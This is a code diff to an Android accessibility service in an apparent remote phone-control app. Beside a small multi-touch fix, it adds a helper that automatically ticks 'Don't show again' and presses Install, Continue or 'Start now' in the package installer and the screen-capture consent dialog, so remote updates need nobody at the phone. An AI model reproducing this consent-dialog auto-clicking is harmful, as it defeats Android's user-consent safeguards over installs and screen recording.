@@ -80,7 +80,10 @@ class ControlAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) onForeground(event.packageName?.toString())
+        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            onForeground(event.packageName?.toString())
+            maybeAutoConfirm(event.packageName?.toString())
+        }
         when (event?.eventType) {
             AccessibilityEvent.TYPE_VIEW_FOCUSED,
             AccessibilityEvent.TYPE_VIEW_CLICKED,
@@ -171,6 +174,35 @@ class ControlAccessibilityService : AccessibilityService() {
         node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
     }
 
+    // ================================================================ self-update helper
+    // Only while our own updater asked for it (a few minutes): press "Install" in the package installer
+    // and "Start now" in the screen-capture dialog, so a remote update needs nobody at the phone.
+    private val confirmWords = listOf("Bắt đầu ngay", "Start now", "Cài đặt", "Install", "Cập nhật", "Update", "Tiếp tục", "Continue")
+    private val dontAskWords = listOf("Không hiển thị lại", "Don't show again", "Do not show again")
+
+    private fun maybeAutoConfirm(pkg: String?) {
+        if (pkg == null || !Updater.autoConfirmActive(this)) return
+        if (!(pkg.contains("packageinstaller") || pkg == "com.android.systemui" || pkg.contains("permissioncontroller"))) return
+        for (d in longArrayOf(250, 800, 1600)) main.postDelayed({ confirmNow() }, d)
+    }
+
+    private fun confirmNow() {
+        if (!Updater.autoConfirmActive(this)) return
+        val root = try { rootInActiveWindow } catch (_: Throwable) { null } ?: return
+        val pkg = root.packageName?.toString() ?: return
+        if (!(pkg.contains("packageinstaller") || pkg == "com.android.systemui" || pkg.contains("permissioncontroller"))) return
+        for (w in dontAskWords) for (n in root.findAccessibilityNodeInfosByText(w)) {
+            if (n.isCheckable && !n.isChecked) n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        }
+        for (w in confirmWords) for (n in root.findAccessibilityNodeInfosByText(w)) {
+            var c: AccessibilityNodeInfo? = n
+            while (c != null && !c.isClickable) c = c.parent
+            if (c != null && c.isEnabled && (c.className?.contains("Button") == true || n.className?.contains("Button") == true)) {
+                c.performAction(AccessibilityNodeInfo.ACTION_CLICK); return
+            }
+        }
+    }
+
     // ================================================================ realtime multi-touch ("game mode")
     // Each finger is a continued stroke. Every short segment we dispatch one gesture that continues all
     // fingers that are down, so several fingers can be held and moved at the same time.
@@ -231,8 +263,9 @@ class ControlAccessibilityService : AccessibilityService() {
     private fun afterSegment(cancelled: Boolean) {
         inFlight = false
         fingers.entries.removeAll { it.value.up }
-        // A cancelled gesture can't be continued: restart the held fingers as fresh strokes.
-        if (cancelled) fingers.values.forEach { it.stroke = null }
+        // A cancelled gesture can't be continued. Pressing again would create stray taps, so the
+        // fingers are dropped; the controller starts a new touch on its next move.
+        if (cancelled) { fingers.clear(); return }
         if (fingers.isNotEmpty()) pump()
     }
 
